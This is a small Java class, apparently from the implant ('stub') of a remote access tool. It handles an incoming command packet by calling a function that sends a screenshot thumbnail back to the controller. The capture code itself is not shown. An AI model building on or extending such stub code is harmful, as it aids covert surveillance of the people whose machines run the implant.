package com.redpois0n.stub.packets.incoming;

import com.redpois0n.RemoteScreen;

public class Packet40Thumbnail extends AbstractIncomingPacket{

	@Override
	public void read() throws Exception {
		RemoteScreen.sendThumbnail();
	}

}
